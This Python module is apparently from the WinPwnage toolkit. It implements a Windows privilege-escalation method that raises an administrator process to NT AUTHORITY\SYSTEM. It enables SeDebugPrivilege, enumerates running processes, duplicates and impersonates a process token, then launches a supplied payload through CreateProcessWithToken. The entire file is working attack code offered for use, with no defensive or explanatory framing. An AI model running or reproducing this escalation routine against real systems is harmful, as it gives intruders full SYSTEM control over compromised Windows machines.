from winpwnage.core.prints import *
from winpwnage.core.utils import *
from winpwnage.core.winstructures import *

#Creds to: https://gist.github.com/highsenburger69/147a16dd003b2fd1eacd9afcd1d0fe7f

elevateMethod2_info = {
	"Description": "Elevate from administrator to NT AUTHORITY SYSTEM using token impersonation",
	"Method": "Token impersonation",
	"Id": "2",
	"Type": "Elevation",
	"Fixed In": "99999" if information().admin() == True else "0",
	"Works From": "7600",
	"Admin": True,
	"Function Name": "elevateMethod2",
	"Function Payload": True,
}

def elevateMethod2(payload):
	if not information().admin():
		print_error("Cannot proceed, we are not elevated")
		return False

	if payloads().exe(payload):
		params = payloads().exe(payload)[1].replace(payloads().exe(payload)[1].split(' ', 1)[0], '').lstrip()
		payload = payloads().exe(payload)[1].split(' ', 1)[0]	

		print_info("Enabling SeDebugPrivilege")
		hToken = HANDLE(c_void_p(-1).value)
		if OpenProcessToken(GetCurrentProcess(),(TOKEN_ALL_ACCESS | TOKEN_PRIVS),byref(hToken)) == 0:
			print_error("Error while grabbing GetCurrentProcess()'s token: {}".format(GetLastError()))

		tp = TOKEN_PRIVILEGES2()
		tp.PrivilegeCount = 1
		tp.Privileges = (20, 0, 0x00000002)

		if AdjustTokenPrivileges(hToken, False, byref(tp), 0, None, None) == 0:
			print_error("Error while assigning SE_DEBUG_NAME to GetCurrentProcess()'s token': {}".format(GetLastError()))
		else:
			print_success("Successfully enabled SeDebugPrivilege")

		DWORD_array = (DWORD * 0xFFFF)
		ProcessIds = DWORD_array()
		ProcessIdsSize = sizeof(ProcessIds)
		ProcessesReturned = DWORD()                                
		EnumProcesses(ProcessIds, ProcessIdsSize, ProcessesReturned)

		RunningProcesses = int(ProcessesReturned.value / sizeof(DWORD))
		for process in range(RunningProcesses):
			ProcessId = ProcessIds[process]
			currenthandle = OpenProcess(PROCESS_QUERY_INFORMATION, False, ProcessId)
			if currenthandle:
				ProcessName = (c_char * 260)()
				if GetProcessImageFileName(currenthandle, ProcessName, 260):
					ProcessName = ProcessName.value.split(b"\\")[-1]
					processToken = HANDLE(c_void_p(-1).value)
					OpenProcessToken(currenthandle, TOKEN_PRIVS, byref(processToken))
					TokenInformation = (c_byte * 4096)()
					ReturnLength = DWORD()
					GetTokenInformation(processToken, TOKEN_INFORMATION_CLASS.TokenUser, byref(TokenInformation), sizeof(TokenInformation), byref(ReturnLength))
					Token = cast(TokenInformation, POINTER(TOKEN_USER))
					StringSid = LPSTR()
					ConvertSidToStringSidA(Token.contents.User.Sid, byref(StringSid))
					hTokendupe = HANDLE(c_void_p(-1).value)
					DuplicateTokenEx(processToken, TOKEN_ALL_ACCESS, None, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, byref(hTokendupe))                
					ImpersonateLoggedOnUser(hTokendupe)
					print_info("Impersonating System IL token")
					lpStartupInfo = STARTUPINFO()            
					lpStartupInfo.cb = sizeof(lpStartupInfo)
					lpProcessInformation = PROCESS_INFORMATION()
					lpStartupInfo.dwFlags = 0x00000001
					lpStartupInfo.wShowWindow = 5

					if CreateProcessWithToken(hTokendupe, 0x00000002, payload, params, 0x00000010, None, None, byref(lpStartupInfo), byref(lpProcessInformation)) == 0:
						print_error("Error while triggering admin payload using CreateProcessWithLogonW: {}".format(GetLastError()))
					else:
						print_success("Successfully elevated process PID: {}".format(lpProcessInformation.dwProcessId))
						break
	else:
		print_error("Cannot proceed, invalid payload")
		return False
